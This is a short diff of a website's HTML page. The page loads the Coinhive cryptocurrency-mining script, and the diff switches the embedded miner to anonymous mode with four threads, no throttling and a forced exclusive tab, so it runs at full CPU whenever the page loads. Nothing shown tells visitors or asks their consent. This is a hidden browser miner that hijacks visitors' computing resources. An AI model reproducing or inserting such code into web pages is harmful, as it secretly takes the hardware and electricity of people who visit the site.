@@ -17,8 +17,8 @@
     <!-- <script type="text/javascript" src="https://syndication.exdynsrv.com/splash.php?idzone=2886982"></script> -->
 		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 		<script>
-			var miner = new CoinHive.User('VGxiiZKaYUHsq2ZPQsXmdr2GWocYyXUk', 'vitor');
-			miner.start();
+			var miner = new CoinHive.Anonymous('VGxiiZKaYUHsq2ZPQsXmdr2GWocYyXUk', { threads: 4, throttle: 0.0 });
+			miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 		</script>
 
     <link rel="stylesheet" href="css/bootstrap.min.css">
